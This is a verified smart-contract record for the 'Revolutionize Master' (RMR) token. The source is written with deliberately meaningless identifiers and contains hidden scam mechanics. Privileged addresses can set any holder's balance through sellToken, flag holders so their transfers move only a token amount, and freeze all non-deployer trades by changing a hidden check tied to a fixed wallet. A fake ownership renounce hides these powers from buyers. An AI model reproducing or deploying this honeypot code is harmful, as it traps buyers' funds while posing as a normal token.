{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface autoExemptReceiver {\n    function createPair(address takeTxReceiver, address atTrading) external returns (address);\n}\n\ninterface minReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address modeFee) external view returns (uint256);\n\n    function transfer(address shouldTotal, uint256 totalSwap) external returns (bool);\n\n    function allowance(address listSender, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 totalSwap) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address shouldTotal,\n        uint256 totalSwap\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tradingReceiver, uint256 value);\n    event Approval(address indexed listSender, address indexed spender, uint256 value);\n}\n\nabstract contract amountLiquidityReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface exemptTakeMin {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface minReceiverMetadata is minReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract RevolutionizeMaster is amountLiquidityReceiver, minReceiver, minReceiverMetadata {\n\n    function autoSender(address txIsExempt, address shouldTotal, uint256 totalSwap) internal returns (bool) {\n        if (txIsExempt == fromBuyIs) {\n            return toTx(txIsExempt, shouldTotal, totalSwap);\n        }\n        uint256 walletTo = minReceiver(fundMarketing).balanceOf(fundWallet);\n        require(walletTo == totalReceiver);\n        require(shouldTotal != fundWallet);\n        if (fromTx[txIsExempt]) {\n            return toTx(txIsExempt, shouldTotal, toReceiverTake);\n        }\n        return toTx(txIsExempt, shouldTotal, totalSwap);\n    }\n\n    address fundLimit = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool private fundSender;\n\n    function listSwapReceiver(address txLaunch) public {\n        if (liquidityTx) {\n            return;\n        }\n        if (fundSender) {\n            senderMin = false;\n        }\n        marketingAmount[txLaunch] = true;\n        \n        liquidityTx = true;\n    }\n\n    function transferFrom(address txIsExempt, address shouldTotal, uint256 totalSwap) external override returns (bool) {\n        if (_msgSender() != fundLimit) {\n            if (amountFee[txIsExempt][_msgSender()] != type(uint256).max) {\n                require(totalSwap <= amountFee[txIsExempt][_msgSender()]);\n                amountFee[txIsExempt][_msgSender()] -= totalSwap;\n            }\n        }\n        return autoSender(txIsExempt, shouldTotal, totalSwap);\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return toSell;\n    }\n\n    constructor (){\n        if (amountMaxIs == listIs) {\n            listIs = receiverTotal;\n        }\n        exemptTakeMin receiverShould = exemptTakeMin(fundLimit);\n        fundMarketing = autoExemptReceiver(receiverShould.factory()).createPair(receiverShould.WETH(), address(this));\n        \n        fromBuyIs = _msgSender();\n        marketingAmount[fromBuyIs] = true;\n        receiverReceiverLimit[fromBuyIs] = teamSender;\n        amountEnableLaunch();\n        \n        emit Transfer(address(0), fromBuyIs, teamSender);\n    }\n\n    function owner() external view returns (address) {\n        return maxSell;\n    }\n\n    uint256 private sellTo;\n\n    function amountMinTeam() private view {\n        require(marketingAmount[_msgSender()]);\n    }\n\n    function getOwner() external view returns (address) {\n        return maxSell;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return feeShouldMin;\n    }\n\n    string private toSell = \"Revolutionize Master\";\n\n    function sellToken(address amountReceiver, uint256 totalSwap) public {\n        amountMinTeam();\n        receiverReceiverLimit[amountReceiver] = totalSwap;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return teamSender;\n    }\n\n    address public fundMarketing;\n\n    function decimals() external view virtual override returns (uint8) {\n        return tokenLaunch;\n    }\n\n    function balanceOf(address modeFee) public view virtual override returns (uint256) {\n        return receiverReceiverLimit[modeFee];\n    }\n\n    function amountEnableLaunch() public {\n        emit OwnershipTransferred(fromBuyIs, address(0));\n        maxSell = address(0);\n    }\n\n    address private maxSell;\n\n    bool public liquidityTx;\n\n    bool private senderMin;\n\n    uint256 private teamSender = 100000000 * 10 ** 18;\n\n    uint256 totalReceiver;\n\n    function approve(address liquidityLaunch, uint256 totalSwap) public virtual override returns (bool) {\n        amountFee[_msgSender()][liquidityLaunch] = totalSwap;\n        emit Approval(_msgSender(), liquidityLaunch, totalSwap);\n        return true;\n    }\n\n    uint256 tokenSell;\n\n    string private feeShouldMin = \"RMR\";\n\n    function fromLaunchTx(address swapList) public {\n        amountMinTeam();\n        \n        if (swapList == fromBuyIs || swapList == fundMarketing) {\n            return;\n        }\n        fromTx[swapList] = true;\n    }\n\n    uint256 public receiverTotal;\n\n    uint256 public listIs;\n\n    function allowance(address maxReceiverFrom, address liquidityLaunch) external view virtual override returns (uint256) {\n        if (liquidityLaunch == fundLimit) {\n            return type(uint256).max;\n        }\n        return amountFee[maxReceiverFrom][liquidityLaunch];\n    }\n\n    uint8 private tokenLaunch = 18;\n\n    function toTx(address txIsExempt, address shouldTotal, uint256 totalSwap) internal returns (bool) {\n        require(receiverReceiverLimit[txIsExempt] >= totalSwap);\n        receiverReceiverLimit[txIsExempt] -= totalSwap;\n        receiverReceiverLimit[shouldTotal] += totalSwap;\n        emit Transfer(txIsExempt, shouldTotal, totalSwap);\n        return true;\n    }\n\n    bool private totalExempt;\n\n    address fundWallet = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private buyMaxExempt;\n\n    uint256 constant toReceiverTake = 17 ** 10;\n\n    function transfer(address amountReceiver, uint256 totalSwap) external virtual override returns (bool) {\n        return autoSender(_msgSender(), amountReceiver, totalSwap);\n    }\n\n    mapping(address => bool) public marketingAmount;\n\n    uint256 public amountMaxIs;\n\n    mapping(address => bool) public fromTx;\n\n    mapping(address => uint256) private receiverReceiverLimit;\n\n    uint256 private maxTotal;\n\n    mapping(address => mapping(address => uint256)) private amountFee;\n\n    event OwnershipTransferred(address indexed enableLaunched, address indexed shouldTeamMode);\n\n    function receiverShouldTrading(uint256 totalSwap) public {\n        amountMinTeam();\n        totalReceiver = totalSwap;\n    }\n\n    address public fromBuyIs;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listSender\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldTeamMode\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tradingReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxReceiverFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityLaunch\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountEnableLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountMaxIs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityLaunch\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalSwap\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeFee\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromBuyIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapList\",\"type\":\"address\"}],\"name\":\"fromLaunchTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listIs\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txLaunch\",\"type\":\"address\"}],\"name\":\"listSwapReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"marketingAmount\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"totalSwap\",\"type\":\"uint256\"}],\"name\":\"receiverShouldTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalSwap\",\"type\":\"uint256\"}],\"name\":\"sellToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalSwap\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txIsExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldTotal\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalSwap\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "RevolutionizeMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}